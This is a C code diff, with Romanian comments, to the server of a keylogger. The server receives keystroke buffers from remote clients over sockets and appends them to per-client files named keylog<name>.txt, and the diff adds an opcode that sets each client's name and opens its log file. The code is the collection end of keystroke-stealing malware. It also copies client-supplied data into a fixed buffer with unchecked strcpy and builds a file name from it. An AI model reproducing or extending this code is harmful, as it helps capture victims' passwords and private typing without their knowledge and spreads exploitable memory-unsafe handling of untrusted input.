@@ -16,18 +16,28 @@ extern clientHandler_t clientHndler;
 void handleOpcode(message_t msg, int clientSock)
 {
 
-    //printf("Handleing Opcode... %c\n", msg.opCode);
     switch (msg.opCode)
     {
         case 'K':
         if(clientHndler.clientsAttr[clientSock].recordKeys)
             {
-                printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd, 
-                msg.buffer, msg.size);
+                //printf("Should write to file %d, buffer: %s; size: %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd, 
+                //msg.buffer, msg.size);
                 if (write(clientHndler.clientsAttr[clientSock].keylogger_fd, msg.buffer, msg.size) == -1)
                 {
                     printf("ERROR WHEN WRITING TO %d\n", clientHndler.clientsAttr[clientSock].keylogger_fd);
                 }
+            }
+        break;
+
+        case 'U':
+            strcpy(clientHndler.clientsAttr[clientSock].name, msg.buffer);
+            char filename[BUFFER_SIZE];
+            snprintf(filename, sizeof(filename), "keylog%s.txt", clientHndler.clientsAttr[clientSock].name);
+
+            clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
+            if (clientHndler.clientsAttr[clientSock].keylogger_fd == -1) {
+                perror("Eroare la deschiderea fișierului de Keylog");
             }
         break;
     default:
@@ -38,38 +48,34 @@ void handleOpcode(message_t msg, int clientSock)
     }
 }
 
-void* handle_client(void* params)
-{
+void* handle_client(void* params) {
     parameters_t *args = (parameters_t*) params;
-    // Open a file to log keystrokes
-    char filename[BUFFER_SIZE];
-    strcpy(filename, "keylog");
-    strcat(filename, clientHndler.clientsAttr[args->client_sock].name);
-    strcat(filename, ".txt");
-    
-    clientHndler.clientsAttr[args->client_sock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
 
-    // Receive data from client
     message_t client_message;
     int read_size;
-    //printf("reciving message from %d...\n", args->client_sock);
-    while ((read_size = (recv(args->client_sock, &client_message, BUFFER_SIZE, 0))) > 0) {
-        //HANDLE OPCODE***********************************
-        printf("Recieved message from %d: %s\n", args->client_sock, client_message.buffer);
+
+    // Primesc date de la client
+    while ((read_size = recv(args->client_sock, &client_message, sizeof(client_message), 0)) > 0) {
+        printf("Mesaj primit de la %d(OpCode: %c): %s\n", args->client_sock, client_message.opCode, client_message.buffer);
         handleOpcode(client_message, args->client_sock);
-        
+        memset(client_message.buffer, 0, sizeof(client_message.buffer));
+
     }
 
     if (read_size == 0) {
-        printf("Client disconnected\n");
+        printf("Clientul %d s-a deconectat.\n", args->client_sock);
     } else if (read_size == -1) {
-        perror("Receive failed");
+        perror("Eroare la primirea datelor");
     }
 
-    close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
+    // Curățare resurse
+    if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1) {
+        close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
+        clientHndler.clientsAttr[args->client_sock].keylogger_fd = -1;
+    }
     close(args->client_sock);
-    close(args->socket_desc);
 
+    free(params);
     return NULL;
 }
 
